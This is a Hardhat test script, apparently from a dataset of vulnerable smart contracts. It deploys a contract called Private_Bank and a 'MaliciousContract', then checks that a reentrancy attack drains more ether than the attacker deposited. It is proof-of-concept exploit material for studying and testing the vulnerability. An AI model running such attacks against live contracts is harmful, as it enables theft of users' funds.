const { expect } = require("chai");
const { ethers } = require("hardhat");
describe("Reentrancy Attack for 0xb5e1b1ee15c6fa0e48fce100125569d430f1bd12.sol", function () {  
    let Private_Bank;
    let victim;
    let MaliciousContract;
    let hacker;
    let Log;
    let log;

    beforeEach(async function () {
        // Deploy Log contract
        Log = await ethers.getContractFactory("contracts/dataset/reentrancy/0xb5e1b1ee15c6fa0e48fce100125569d430f1bd12.sol:Log");
        log = await Log.deploy();
        await log.waitForDeployment();

        // Deploy Private_Bank contract with Log address
        Private_Bank = await ethers.getContractFactory("contracts/dataset/reentrancy/0xb5e1b1ee15c6fa0e48fce100125569d430f1bd12.sol:Private_Bank");
        victim = await Private_Bank.deploy(log.target);
        await victim.waitForDeployment();
        //await victim.setLog(log.target); // Set Log address after deployment

        // Deploy MaliciousContract with Private_Bank address
        MaliciousContract = await ethers.getContractFactory("contracts/reentrancy/0xb5e1b1ee15c6fa0e48fce100125569d430f1bd12_attack.sol:MaliciousContract");
        hacker = await MaliciousContract.deploy(victim.target);
        
    });

    it("should successfully drain funds through reentrancy attack", async function () {
        // Initial deposit to victim contract
        await victim.Deposit( {value: ethers.parseEther("5") });

        const victimInitialBalance = await ethers.provider.getBalance(victim.target);
        expect(victimInitialBalance).to.equal(ethers.parseEther("5")); 


        // Initial deposit from hacker on victim contract
        await hacker.deposit({value:  ethers.parseEther("2")});

        const victimBalanceAfterDeposit = await ethers.provider.getBalance(victim.target);
        expect(victimBalanceAfterDeposit).to.equal(ethers.parseEther("7")); 

        // Set hacker balance to 0
        await network.provider.send("hardhat_setBalance", [
            hacker.target,
            "0x0",
          ]);
        let hackerBalance = await ethers.provider.getBalance(hacker.target);
        expect(hackerBalance).to.equal(0);


        // Perform reentrancy attack through MaliciousContract
        await hacker.attack(ethers.parseEther("2"));
        
        // Check balances after attack
        const victimBalance = await ethers.provider.getBalance(victim.target);
        hackerBalance = await ethers.provider.getBalance(hacker.target);

        // Verify the attack was successful
        
        // victim has lost more funds than the withdrawal
        expect(victimBalance).to.be.below(ethers.parseEther("5")); 

        // hacker has more than the withdrawal 
        expect(hackerBalance).to.be.above(ethers.parseEther("2"));
        
    });
    });
  